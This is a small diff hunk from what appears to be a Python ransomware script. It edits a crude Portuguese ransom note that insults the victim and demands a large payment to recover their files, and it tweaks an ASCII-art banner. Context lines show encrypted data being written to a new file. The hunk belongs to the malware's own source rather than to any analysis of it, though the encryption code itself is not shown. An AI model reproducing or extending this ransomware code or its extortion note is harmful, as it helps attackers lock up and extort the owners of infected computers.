@@ -22,8 +22,9 @@ new_file.write(crypto_data)
 new_file.close()
 
 # create txt
-texto = b'sifudeu compiuter infectado otario\npague uma caralhada de dinheiro para recuperar os seus arquivos\n'
-art = b'''                         ______                     
+texto = b'sifudeu, compiuter infectado otario\npague uma caralhada de dinheiro para recuperar os seus arquivos\n'
+art = b'''  
+                       ______                     
  _________        .---"""      """---.              
 :______.-':      :  .--------------.  :             
 | ______  |      | :                : |             
